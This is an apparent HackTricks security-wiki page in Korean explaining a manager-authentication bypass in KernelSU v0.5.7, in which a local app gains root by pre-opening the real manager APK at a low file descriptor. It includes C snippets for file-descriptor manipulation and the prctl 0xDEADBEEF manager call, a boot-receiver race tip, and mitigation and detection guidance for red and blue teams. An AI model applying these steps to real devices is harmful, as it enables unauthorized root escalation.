# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

KernelSU, APatch, SKRoot 및 Magisk와 같은 루팅 프레임워크는 Linux/Android 커널을 자주 패치하고 후킹된 시스템 호출을 통해 비특권 사용자 공간 "관리자" 앱에 특권 기능을 노출합니다. 관리자 인증 단계에 결함이 있는 경우, 모든 로컬 앱이 이 채널에 접근하여 이미 루팅된 장치에서 권한을 상승시킬 수 있습니다.

이 페이지는 공공 연구에서 발견된 기술과 함정을 추상화하여(특히 Zimperium의 KernelSU v0.5.7 분석) 레드 팀과 블루 팀이 공격 표면, 취약점 원시 및 강력한 완화 방법을 이해하는 데 도움을 줍니다.

---
## 아키텍처 패턴: 시스템 호출 후킹된 관리자 채널

- 커널 모듈/패치가 시스템 호출(일반적으로 prctl)을 후킹하여 사용자 공간에서 "명령"을 수신합니다.
- 프로토콜은 일반적으로: magic_value, command_id, arg_ptr/len ...
- 사용자 공간 관리자 앱이 먼저 인증합니다(예: CMD_BECOME_MANAGER). 커널이 호출자를 신뢰할 수 있는 관리자라고 표시하면 특권 명령이 수락됩니다:
- 호출자에게 루트 권한 부여(예: CMD_GRANT_ROOT)
- su에 대한 허용 목록/거부 목록 관리
- SELinux 정책 조정(예: CMD_SET_SEPOLICY)
- 버전/구성 쿼리
- 모든 앱이 시스템 호출을 호출할 수 있기 때문에 관리자 인증의 정확성이 중요합니다.

예시 (KernelSU 설계):
- 후킹된 시스템 호출: prctl
- KernelSU 핸들러로 전환하기 위한 매직 값: 0xDEADBEEF
- 명령에는 다음이 포함됩니다: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT 등.

---
## KernelSU v0.5.7 인증 흐름 (구현된 대로)

사용자 공간이 prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...)를 호출하면 KernelSU는 다음을 확인합니다:

1) 경로 접두사 확인
- 제공된 경로는 호출자 UID에 대한 예상 접두사로 시작해야 합니다. 예: /data/data/<pkg> 또는 /data/user/<id>/<pkg>.
- 참조: core_hook.c (v0.5.7) 경로 접두사 논리.

2) 소유권 확인
- 경로는 호출자 UID가 소유해야 합니다.
- 참조: core_hook.c (v0.5.7) 소유권 논리.

3) FD 테이블 스캔을 통한 APK 서명 확인
- 호출 프로세스의 열린 파일 설명자(FD)를 반복합니다.
- 경로가 /data/app/*/base.apk와 일치하는 첫 번째 파일을 선택합니다.
- APK v2 서명을 구문 분석하고 공식 관리자 인증서와 비교하여 확인합니다.
- 참조: manager.c (FD 반복), apk_sign.c (APK v2 확인).

모든 검사가 통과하면 커널은 관리자의 UID를 일시적으로 캐시하고 해당 UID에서 특권 명령을 수락합니다.

---
## 취약점 클래스: FD 반복에서 "첫 번째 일치하는 APK"를 신뢰하기

서명 확인이 프로세스 FD 테이블에서 발견된 "첫 번째 일치하는 /data/app/*/base.apk"에 바인딩되면, 실제로 호출자의 패키지를 확인하지 않습니다. 공격자는 합법적으로 서명된 APK(실제 관리자)를 미리 배치하여 자신의 base.apk보다 FD 목록에서 더 일찍 나타나게 할 수 있습니다.

이 간접 신뢰는 비특권 앱이 관리자의 서명 키를 소유하지 않고도 관리자를 가장할 수 있게 합니다.

악용되는 주요 속성:
- FD 스캔은 호출자의 패키지 ID에 바인딩되지 않으며, 경로 문자열만 패턴 일치합니다.
- open()은 사용 가능한 가장 낮은 FD를 반환합니다. 공격자는 낮은 번호의 FD를 먼저 닫음으로써 순서를 제어할 수 있습니다.
- 필터는 경로가 /data/app/*/base.apk와 일치하는지만 확인하며, 호출자의 설치된 패키지와 일치하는지는 확인하지 않습니다.

---
## 공격 전제 조건

- 장치는 이미 취약한 루팅 프레임워크(예: KernelSU v0.5.7)로 루팅되어 있습니다.
- 공격자는 로컬에서 임의의 비특권 코드를 실행할 수 있습니다(안드로이드 앱 프로세스).
- 실제 관리자가 아직 인증되지 않았습니다(예: 재부팅 직후). 일부 프레임워크는 성공 후 관리자 UID를 캐시합니다; 경쟁에서 이겨야 합니다.

---
## 취약점 개요 (KernelSU v0.5.7)

상위 단계:
1) 접두사 및 소유권 검사를 만족시키기 위해 자신의 앱 데이터 디렉토리에 대한 유효한 경로를 구축합니다.
2) 진짜 KernelSU 관리자 base.apk가 자신의 base.apk보다 낮은 번호의 FD에서 열려 있는지 확인합니다.
3) prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...)를 호출하여 검사를 통과합니다.
4) CMD_GRANT_ROOT, CMD_ALLOW_SU, CMD_SET_SEPOLICY와 같은 특권 명령을 발행하여 권한 상승을 지속합니다.

2단계에 대한 실용적인 메모 (FD 순서):
- /proc/self/fd 심볼릭 링크를 통해 자신의 /data/app/*/base.apk에 대한 프로세스의 FD를 식별합니다.
- 낮은 FD(예: stdin, fd 0)를 닫고 합법적인 관리자 APK를 먼저 열어 fd 0(또는 자신의 base.apk fd보다 낮은 인덱스)을 차지하게 합니다.
- 합법적인 관리자 APK를 자신의 앱과 함께 번들로 묶어 경로가 커널의 단순 필터를 만족하도록 합니다. 예를 들어, /data/app/*/base.apk와 일치하는 하위 경로에 배치합니다.

예시 코드 스니펫 (Android/Linux, 설명용만):

열린 FD를 열거하여 base.apk 항목을 찾기:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
낮은 번호의 FD가 정당한 매니저 APK를 가리키도록 강제합니다:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
매니저 인증을 prctl 훅을 통해:
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 0x100  // Placeholder; command IDs are framework-specific

static inline long ksu_call(unsigned long cmd, unsigned long arg2,
unsigned long arg3, unsigned long arg4) {
return prctl(KSU_MAGIC, cmd, arg2, arg3, arg4);
}

int become_manager(const char *my_data_dir) {
long result = -1;
// arg2: command, arg3: pointer to data path (userspace->kernel copy), arg4: optional result ptr
result = ksu_call(CMD_BECOME_MANAGER, (unsigned long)my_data_dir, 0, 0);
return (int)result;
}
```
성공 후, 권한 있는 명령어 (예시):
- CMD_GRANT_ROOT: 현재 프로세스를 루트로 승격
- CMD_ALLOW_SU: 지속적인 su를 위해 패키지/UID를 허용 목록에 추가
- CMD_SET_SEPOLICY: 프레임워크에서 지원하는 대로 SELinux 정책 조정

경쟁/지속성 팁:
- AndroidManifest에 BOOT_COMPLETED 수신기를 등록하여 재부팅 후 조기에 시작하고 실제 관리자 이전에 인증을 시도합니다.

---
## 탐지 및 완화 지침

프레임워크 개발자를 위해:
- 인증을 호출자의 패키지/UID에 바인딩하고 임의의 FD에 바인딩하지 마십시오:
- UID에서 호출자의 패키지를 확인하고 FD를 스캔하는 대신 설치된 패키지의 서명(패키지 관리자 통해)과 비교합니다.
- 커널 전용인 경우, 안정적인 호출자 신원(작업 자격 증명)을 사용하고 프로세스 FD가 아닌 init/userspace 도우미가 관리하는 안정적인 진실의 출처에서 검증합니다.
- 신원으로서 경로 접두사 검사를 피하십시오; 호출자가 쉽게 만족시킬 수 있습니다.
- 채널을 통한 논스 기반 챌린지-응답을 사용하고 부팅 시 또는 주요 이벤트에서 캐시된 관리자 신원을 지웁니다.
- 가능할 경우 일반 시스템 호출을 과부하하는 대신 바인더 기반 인증 IPC를 고려하십시오.

수비수/블루 팀을 위해:
- 루팅 프레임워크 및 관리자 프로세스의 존재를 탐지합니다; 커널 텔레메트리가 있는 경우 의심스러운 매직 상수(예: 0xDEADBEEF)를 가진 prctl 호출을 모니터링합니다.
- 관리되는 플릿에서 부팅 후 빠르게 권한 있는 관리자 명령을 시도하는 신뢰할 수 없는 패키지의 부팅 수신기를 차단하거나 경고합니다.
- 장치가 패치된 프레임워크 버전으로 업데이트되었는지 확인합니다; 업데이트 시 캐시된 관리자 ID를 무효화합니다.

공격의 한계:
- 이미 취약한 프레임워크로 루팅된 장치에만 영향을 미칩니다.
- 일반적으로 합법적인 관리자가 인증되기 전에 재부팅/경쟁 창이 필요합니다(일부 프레임워크는 관리자 UID를 재설정할 때까지 캐시합니다).

---
## 프레임워크 간 관련 노트

- 비밀번호 기반 인증(예: 역사적 APatch/SKRoot 빌드)은 비밀번호가 추측 가능하거나 무차별 대입 가능하거나 검증이 버그가 있는 경우 약할 수 있습니다.
- 패키지/서명 기반 인증(예: KernelSU)은 원칙적으로 더 강하지만 실제 호출자에 바인딩해야 하며 FD 스캔과 같은 간접적인 유물에 바인딩해서는 안 됩니다.
- Magisk: CVE-2024-48336 (MagiskEoP)는 성숙한 생태계조차도 관리자 컨텍스트 내에서 코드 실행으로 이어지는 신원 스푸핑에 취약할 수 있음을 보여주었습니다.

---
## 참조

- [Zimperium – The Rooting of All Evil: Security Holes That Could Compromise Your Mobile Device](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [KernelSU v0.5.7 – core_hook.c path checks (L193, L201)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L193)
- [KernelSU v0.5.7 – manager.c FD iteration/signature check (L43+)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L43)
- [KernelSU – apk_sign.c APK v2 verification (main)](https://github.com/tiann/KernelSU/blob/main/kernel/apk_sign.c#L319)
- [KernelSU project](https://kernelsu.org/)
- [APatch](https://github.com/bmax121/APatch)
- [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [KSU PoC demo video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)

{{#include ../../banners/hacktricks-training.md}}
